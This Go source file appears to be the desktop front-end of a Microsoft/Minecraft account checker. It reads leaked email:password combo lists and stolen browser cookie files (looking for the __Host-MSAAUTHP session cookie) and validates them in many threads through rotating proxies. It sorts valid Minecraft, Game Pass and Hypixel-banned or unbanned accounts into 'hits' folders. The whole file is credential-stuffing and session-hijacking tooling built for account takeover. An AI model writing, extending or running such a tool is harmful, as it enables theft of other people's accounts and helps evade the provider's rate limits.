package main

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/wailsapp/wails/v2/pkg/runtime"
)

type App struct {
	ctx     context.Context
	started bool
	cfg     *Config
}

func NewApp() *App {
	return &App{}
}

func (a *App) startup(ctx context.Context) {
	a.ctx = ctx
	IsTerminal = false
	cfg, err := loadConfig("config.json")
	if err == nil {
		a.cfg = cfg
	}

	OnLog = func(level LogLevel, msg string) {
		runtime.EventsEmit(ctx, "checker:log", map[string]interface{}{
			"level": int(level),
			"msg":   msg,
		})
	}

	OnProgress = func(stats ProgressStats) {
		runtime.EventsEmit(ctx, "checker:progress", stats)
	}

	OnComplete = func(summary CheckSummary) {
		runtime.EventsEmit(ctx, "checker:complete", summary)
	}
}

func (a *App) LoadConfig() string {
	cfg, err := loadConfig("config.json")
	if err != nil {
		return "{}"
	}
	a.cfg = cfg
	data, _ := json.MarshalIndent(cfg, "", "  ")
	return string(data)
}

func (a *App) SaveConfig(jsonStr string) string {
	var cfg Config
	if err := json.Unmarshal([]byte(jsonStr), &cfg); err != nil {
		return "error: " + err.Error()
	}
	data, _ := json.MarshalIndent(cfg, "", "  ")
	if err := os.WriteFile("config.json", data, 0644); err != nil {
		return "error: " + err.Error()
	}
	a.cfg = &cfg
	return "ok"
}

func (a *App) StartChecking(threads int) {
	if a.started {
		return
	}
	a.started = true
	atomic.StoreInt32(&checkingStopped, 0)

	cfg := a.cfg
	if cfg == nil {
		c, err := loadConfig("config.json")
		if err != nil {
			runtime.EventsEmit(a.ctx, "checker:complete", map[string]interface{}{
				"error": "Failed to load config",
			})
			a.started = false
			return
		}
		cfg = c
	}

	go a.runChecker(cfg, threads)
}

func (a *App) StopChecking() {
	atomic.StoreInt32(&checkingStopped, 1)
}

func (a *App) OpenFolder(path string) {
	if path == "" {
		path = "."
	}
	abs, err := filepath.Abs(path)
	if err != nil {
		return
	}
	os.StartProcess("cmd", []string{"/c", "start", ""}, &os.ProcAttr{Dir: abs})
}

func (a *App) GetRunDir() string {
	return currentRunDir
}

func (a *App) IsRunning() bool {
	return a.started
}

func (a *App) runChecker(cfg *Config, threads int) {
	defer func() { a.started = false }()

	resetStats()

	currentRunDir = getNextRunDir()
	os.MkdirAll(filepath.Join(currentRunDir, "minecraft", "all_mc_hits"), 0755)
	os.MkdirAll(filepath.Join(currentRunDir, "minecraft", "hypixel_hits", "banned"), 0755)
	os.MkdirAll(filepath.Join(currentRunDir, "minecraft", "hypixel_hits", "unbanned"), 0755)

	runtime.EventsEmit(a.ctx, "checker:rundir", currentRunDir)

	var combos []string
	if _, err := os.Stat("combos.txt"); err == nil {
		combos, _ = loadFile("combos.txt")
		combos = removeDuplicates(combos)
		runtime.EventsEmit(a.ctx, "checker:log", map[string]interface{}{
			"level": int(LogSuccess),
			"msg":   fmt.Sprintf("Loaded %d unique combos", len(combos)),
		})
	}

	var cookieFiles []string
	if cfg.CookieCheck {
		cookiePath := cfg.CookiePath
		if cookiePath == "" {
			cookiePath = "cookies"
		}
		if _, err := os.Stat(cookiePath); err == nil {
			filepath.Walk(cookiePath, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() || !strings.HasSuffix(info.Name(), ".txt") {
					return nil
				}
				cookieFiles = append(cookieFiles, path)
				return nil
			})
			runtime.EventsEmit(a.ctx, "checker:log", map[string]interface{}{
				"level": int(LogSuccess),
				"msg":   fmt.Sprintf("Loaded %d cookie files", len(cookieFiles)),
			})
		}
	}

	var proxies []string
	if cfg.ProxyMode != "" {
		proxies, _ = loadFile("proxies.txt")
	}

	totalWork := len(combos) + len(cookieFiles)
	if totalWork == 0 {
		runtime.EventsEmit(a.ctx, "checker:log", map[string]interface{}{
			"level": int(LogError),
			"msg":   "Nothing to check. Provide combos.txt or enable cookie_check.",
		})
		runtime.EventsEmit(a.ctx, "checker:complete", CheckSummary{
			ProgressStats: collectStats(),
			TotalCombos:  len(combos),
			TotalCookies: len(cookieFiles),
			RunDir:       currentRunDir,
		})
		return
	}

	startTime := time.Now()

	emitProgress := func() {
		elapsed := time.Since(startTime).Seconds()
		total := atomic.LoadInt64(&totalChecked) + atomic.LoadInt64(&cookieTotal)
		cpm := float64(0)
		if elapsed > 1 {
			cpm = float64(total) / elapsed * 60
		}
		stats := ProgressStats{
			TotalChecked:   atomic.LoadInt64(&totalChecked),
			MCHits:         atomic.LoadInt64(&mcHits),
			XGPUHits:       atomic.LoadInt64(&xgpuHits),
			RPHits:         atomic.LoadInt64(&rpHits),
			ValidCount:     atomic.LoadInt64(&validCount),
			HypixelBanned:  atomic.LoadInt64(&hypixelBanned),
			HypixelUnban:   atomic.LoadInt64(&hypixelUnban),
			CookieValid:    atomic.LoadInt64(&cookieValid),
			CookieInvalid:  atomic.LoadInt64(&cookieInvalid),
			CookieTotal:    atomic.LoadInt64(&cookieTotal),
			ElapsedSeconds: elapsed,
			CPM:            cpm,
		}
		if OnProgress != nil {
			OnProgress(stats)
		}
	}

	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup

	for _, combo := range combos {
		if atomic.LoadInt32(&checkingStopped) == 1 {
			break
		}
		parts := strings.SplitN(combo, ":", 2)
		if len(parts) != 2 {
			continue
		}
		email := parts[0]
		password := parts[1]

		sem <- struct{}{}
		wg.Add(1)
		go func(email, password string) {
			defer wg.Done()
			defer func() { <-sem }()
			proxyURL := pickProxy(proxies, cfg.ProxyMode)
			checkAccount(email, password, proxyURL, cfg)
			emitProgress()
		}(email, password)
	}

	msChan := make(chan cookieXboxResult, 200)
	var stage1Wg sync.WaitGroup
	for _, cf := range cookieFiles {
		if atomic.LoadInt32(&checkingStopped) == 1 {
			break
		}
		stage1Wg.Add(1)
		go func(cf string) {
			defer stage1Wg.Done()
			proxyURL := pickProxy(proxies, cfg.ProxyMode)
			client := buildHTTPClient(proxyURL)

			atomic.AddInt64(&cookieTotal, 1)
			cookies, rawLines, err := parseCookieFile(cf)
			if err != nil {
				ce := categorizeCookieError(fmt.Errorf("parse error: %w", err))
				atomic.AddInt64(&cookieInvalid, 1)
				safeWrite("cookie_errors.log", fmt.Sprintf("[PARSE] %s | %s | %s", cf, ce.Category, ce.Detail))
				logErrorLine("[PARSE_ERR] %s | %s", cf, ce.Detail)
				emitProgress()
				return
			}

			msauthCookie, ok := cookies["__Host-MSAAUTHP"]
			if !ok {
				atomic.AddInt64(&cookieInvalid, 1)
				safeWrite("cookie_errors.log", fmt.Sprintf("[MISSING] %s | No __Host-MSAAUTHP cookie found", cf))
				logErrorLine("[MISSING] %s | no __Host-MSAAUTHP cookie", cf)
				emitProgress()
				return
			}

			uhs, bearer, err := cookieXboxAuth(client, msauthCookie)
			if err != nil {
				ce := categorizeCookieError(err)
				atomic.AddInt64(&cookieInvalid, 1)
				ll := fmt.Sprintf("[%s] %s | %s", ce.Category, cf, ce.Detail)
				safeWrite("cookie_errors.log", ll)
				switch ce.Category {
				case "EXPIRED", "AUTH_FAILED", "MC_REJECTED":
					safeWrite("cookie_invalid.txt", fmt.Sprintf("%s | %s: %s", cf, ce.Category, ce.Message))
					logErrorLine("[%s] %s | %s", ce.Category, cf, ce.Message)
				case "TIMEOUT", "NETWORK":
					safeWrite("cookie_network_errors.log", ll)
					logLine("[%s] %s", ce.Category, cf)
				case "RATE_LIMITED":
					safeWrite("cookie_rate_limited.log", ll)
					logLine("[RATE_LIMITED] %s", cf)
				default:
					safeWrite("cookie_unknown_errors.log", ll)
					logErrorLine("[COOKIE_ERR] %s | %s", cf, ce.Message)
				}
				emitProgress()
				return
			}

			msChan <- cookieXboxResult{client: client, cookieFile: cf, rawLines: rawLines, uhs: uhs, bearer: bearer}
		}(cf)
		time.Sleep(50 * time.Millisecond)
	}

	go func() {
		stage1Wg.Wait()
		close(msChan)
	}()

	var stage2Wg sync.WaitGroup
	for i := 0; i < 8; i++ {
		stage2Wg.Add(1)
		go func() {
			defer stage2Wg.Done()
			for data := range msChan {
				if atomic.LoadInt32(&checkingStopped) == 1 {
					continue
				}
				processCookieStage2(data, cfg)
				emitProgress()
			}
		}()
	}
	stage2Wg.Wait()

	wg.Wait()

	closeAllFiles()

	summary := CheckSummary{
		ProgressStats: collectStats(),
		TotalCombos:   len(combos),
		TotalCookies:  len(cookieFiles),
		RunDir:        currentRunDir,
	}
	if OnComplete != nil {
		OnComplete(summary)
	}
}

func collectStats() ProgressStats {
	return ProgressStats{
		TotalChecked:   atomic.LoadInt64(&totalChecked),
		MCHits:         atomic.LoadInt64(&mcHits),
		XGPUHits:       atomic.LoadInt64(&xgpuHits),
		RPHits:         atomic.LoadInt64(&rpHits),
		ValidCount:     atomic.LoadInt64(&validCount),
		HypixelBanned:  atomic.LoadInt64(&hypixelBanned),
		HypixelUnban:   atomic.LoadInt64(&hypixelUnban),
		CookieValid:    atomic.LoadInt64(&cookieValid),
		CookieInvalid:  atomic.LoadInt64(&cookieInvalid),
		CookieTotal:    atomic.LoadInt64(&cookieTotal),
	}
}

func resetStats() {
	atomic.StoreInt64(&totalChecked, 0)
	atomic.StoreInt64(&validCount, 0)
	atomic.StoreInt64(&invalidCount, 0)
	atomic.StoreInt64(&lockedCount, 0)
	atomic.StoreInt64(&mcHits, 0)
	atomic.StoreInt64(&xgpuHits, 0)
	atomic.StoreInt64(&rpHits, 0)
	atomic.StoreInt64(&hypixelBanned, 0)
	atomic.StoreInt64(&hypixelUnban, 0)
	atomic.StoreInt64(&cookieTotal, 0)
	atomic.StoreInt64(&cookieValid, 0)
	atomic.StoreInt64(&cookieInvalid, 0)
	proxyIndex = 0
	currentRunDir = ""
}
